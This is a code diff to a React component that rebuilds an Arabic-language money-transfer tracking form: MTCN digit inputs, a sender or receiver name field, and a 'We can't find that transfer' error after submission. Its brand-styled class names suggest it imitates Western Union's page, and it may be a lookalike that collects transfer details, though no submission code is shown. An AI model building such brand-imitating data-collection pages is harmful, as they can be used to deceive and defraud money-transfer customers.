@@ -125,12 +125,23 @@ export default function TrackTransfer() {
           </button>
         </div>
 
-        {activeTab === "sender" ? (
-          <div className="space-y-6">
-            {/* MTCN Error Message */}
-            <p className="text-sm text-gray-500">track-transfer.mtcn_text_input_error_new</p>
+        {/* Shared MTCN section — always visible */}
+        <div className="space-y-6">
+          <p className="text-sm text-gray-500">track-transfer.mtcn_text_input_error_new</p>
 
-            {/* MTCN Input */}
+          {/* MTCN — inputs when no error, display when error */}
+          {showError ? (
+            <div dir="ltr">
+              <div className="flex flex-nowrap gap-0 justify-between w-full">
+                {mtcn.map((digit, i) => (
+                  <div key={i} className="w-[9%] flex flex-col items-center">
+                    <span className="text-xl text-gray-800">{[3, 6].includes(i) ? `– ${digit}` : digit}</span>
+                    <span className="w-full border-b-2 border-gray-400 mt-1 block" />
+                  </div>
+                ))}
+              </div>
+            </div>
+          ) : (
             <div dir="ltr" className="flex flex-nowrap gap-0 justify-between w-full">
               {mtcn.map((digit, i) => (
                 <input
@@ -146,16 +157,13 @@ export default function TrackTransfer() {
                 />
               ))}
             </div>
+          )}
 
-            {/* Red Error after submit */}
-            {showError && (
-              <p className="text-sm font-medium" style={{ color: "#c0392b" }}>
-                track-transfer.mtcn_text_input_error_new
-              </p>
-            )}
-
-            {/* First Name Input */}
-            <div>
+          {/* Name field */}
+          {showError ? (
+            <p className="text-sm text-gray-800 py-2 border-b border-gray-200 text-left">{firstName || "\u00A0"}</p>
+          ) : (
+            activeTab === "sender" ? (
               <input
                 type="text"
                 placeholder="الاسم الأول للمرسل"
@@ -163,75 +171,50 @@ export default function TrackTransfer() {
                 onChange={(e) => setFirstName(e.target.value)}
                 className="w-full border-b border-gray-300 py-2 text-sm focus:outline-none focus:border-gray-700 bg-transparent placeholder-gray-400 text-left"
               />
-            </div>
-
-            {/* Continue Button */}
-            <button
-              onClick={() => handleSubmit("sender", firstName)}
-              disabled={sending}
-              className="w-full bg-wu-purple text-white py-4 rounded text-base font-medium hover:bg-wu-purple-dark transition-colors disabled:opacity-60"
-            >
-              المتابعة
-            </button>
-
-            {/* MTCN Help Link */}
-            <div className="text-center">
-              <a href="#" className="text-wu-blue text-sm">
-                لا تعرف رقم التتبع (MTCN)؟
-              </a>
-            </div>
-          </div>
-        ) : (
-          <div className="space-y-6">
-            {/* Receiver tab */}
-            <p className="text-sm text-gray-500">track-transfer.mtcn_text_input_error_new</p>
-
-            <div dir="ltr" className="flex flex-nowrap gap-0 justify-between w-full">
-              {mtcn.map((digit, i) => (
-                <input
-                  key={i}
-                  ref={(el) => { inputRefs.current[i] = el; }}
-                  type="text"
-                  inputMode="numeric"
-                  maxLength={1}
-                  value={digit}
-                  onChange={(e) => handleMtcnChange(i, e.target.value)}
-                  onKeyDown={(e) => handleMtcnKeyDown(i, e)}
-                  className="w-[9%] border-b-2 border-gray-300 text-center text-base focus:outline-none focus:border-gray-700 bg-transparent py-1"
-                />
-              ))}
-            </div>
-
-            {/* Red Error after submit */}
-            {showError && (
-              <p className="text-sm font-medium" style={{ color: "#c0392b" }}>
-                track-transfer.mtcn_text_input_error_new
-              </p>
-            )}
-
-            <div>
+            ) : (
               <input
                 type="text"
                 placeholder="الاسم الأول للمستلم"
+                value={firstName}
+                onChange={(e) => setFirstName(e.target.value)}
                 className="w-full border-b border-gray-300 py-2 text-sm focus:outline-none focus:border-gray-700 bg-transparent placeholder-gray-400 text-right"
               />
-            </div>
+            )
+          )}
 
-            <button
-              onClick={() => handleSubmit("receiver", "")}
-              disabled={sending}
-              className="w-full bg-wu-purple text-white py-4 rounded text-base font-medium hover:bg-wu-purple-dark transition-colors disabled:opacity-60"
-            >
-              المتابعة
-            </button>
+          {/* Red error message after submit */}
+          {showError && (
+            <p className="font-bold text-sm leading-snug" style={{ color: "#c0392b" }}>
+              We can't find that transfer. Please check and re-enter the information below.
+            </p>
+          )}
 
-            <div className="text-center">
-              <a href="#" className="text-wu-blue text-sm">
-                لا تعرف رقم التتبع (MTCN)؟
-              </a>
-            </div>
+          {/* Continue Button */}
+          <button
+            onClick={() => {
+              if (showError) {
+                setShowError(false);
+              } else {
+                handleSubmit(activeTab, firstName);
+              }
+            }}
+            disabled={sending}
+            className="w-full text-white py-4 rounded text-base font-medium transition-colors disabled:opacity-60"
+            style={showError
+              ? { backgroundColor: "#1e3a6e", border: "2px solid #2a4a8e" }
+              : { backgroundColor: "#5d5fef" }
+            }
+          >
+            المتابعة
+          </button>
+
+          {/* MTCN Help Link */}
+          <div className="text-center">
+            <a href="#" className="text-wu-blue text-sm">
+              لا تعرف رقم التتبع (MTCN)؟
+            </a>
           </div>
-        )}
+        </div>
       </main>
 
       {/* Footer Links */}
